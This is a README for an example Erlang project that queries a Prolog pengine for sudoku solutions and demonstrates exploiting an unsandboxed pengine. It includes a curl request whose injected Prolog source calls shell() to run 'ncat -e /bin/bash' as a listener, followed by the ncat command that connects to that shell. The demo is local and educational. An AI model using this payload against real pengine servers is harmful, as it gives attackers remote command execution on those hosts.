# sudoku_solver_exploit

An example of using `erl_pengine` to query a prolog pengine for sudoku solutions and an example how a non-secure pengine can be exploited.

Build and compile

```bash
$ rebar3 compile
```

Open up an erlang shell with the project loaded using `rebar3 shell`

```bash
$ rebar3 shell
===> Verifying dependencies...
===> Compiling sudoku_solver
Eshell V8.3  (abort with ^G)
1>
```

Start the prolog server somewhere if it isn't already started.

Use a command similar to this to start it from the erlang shell:

```
os:cmd("current_dir=$PWD; cd /home/kim/workspace/erlang/erl_pengine/examples/sudoku_solver/prolog; prolog daemon.pl --http=4000 --pidfile=/home/kim/workspace/erlang/erl_pengine/examples/sudoku_solver/prolog/pid/http.pid; cd $current_dir").
```

Start the `erl_pengine` application, since this example project is an OTP library we can do it manually
(in case of an OTP application you would have it started automatically as a dependency):

 ```erlang
 application:ensure_all_started(erl_pengine).
 ```

 Read prolog source with a prolog instance to be injected into the pengine upon creation:

 ```erlang
 {ok, Src} = file:read_file("/home/kim/workspace/erlang/erl_pengine/examples/sudoku_solver_exploit/prolog/src_text_exploit.pl").
 ```

 Call the single function exported by `sudoku_solver_exploit` API `solve_sudoku/1`:

 ```erlang
 %% solve_sudoku will create pengine with the given source and query it for a solution of the sudoku-problem specified in Src
 3> sudoku_solver:solve_sudoku(Src).
 [[9,8,7,6,5,4,3,2,1],
  [2,4,6,1,7,3,9,8,5],
  [3,5,1,9,2,8,7,4,6],
  [1,2,8,5,3,7,6,9,4],
  [6,3,4,8,9,2,1,5,7],
  [7,9,5,4,6,1,8,3,2],
  [5,1,9,2,8,6,4,7,3],
  [4,7,2,3,1,9,5,6,8],
  [8,6,3,7,4,5,2,1,9]]
 4>
 ```

Alternatively you can send the explit with Curl:


```bash
curl --header "Content-Type: application/json" --request POST      --data $'{"application": "pengine_sandbox", "as": "problem(1, Rows), sudoku(Rows)", "chunk": 1, "destroy": true, "format":"json", "src_text": "problem(1, [[_,_,_,_,_,_,_,_,_],[_,_,_,_,_,3,_,8,5],[_,_,1,_,2,_,_,_,_],[_,_,_,5,_,7,_,_,_],[_,_,4,_,_,_,1,_,_],[_,9,_,_,_,_,_,_,_],[5,_,_,_,_,_,_,7,3],[_,_,2,_,1,_,_,_,_],[_,_,_,_,4,_,_,_,9]]):-\n\tshell(\\"ncat -n -v -l -p 5555 -e /bin/bash &\\").\n"}' http://127.0.0.1:4000/pengine/create
 ```

After sending the exploit you can get a reverse shell by running:
```bash
ncat -nv 127.0.0.1 5555
```



 Stopping:

 ```erlang
application:stop(erl_pengine),
os:cmd("cat /home/kim/workspace/erlang/erl_pengine/examples/sudoku_solver/prolog/pid/http.pid | xargs kill -9").
 ```
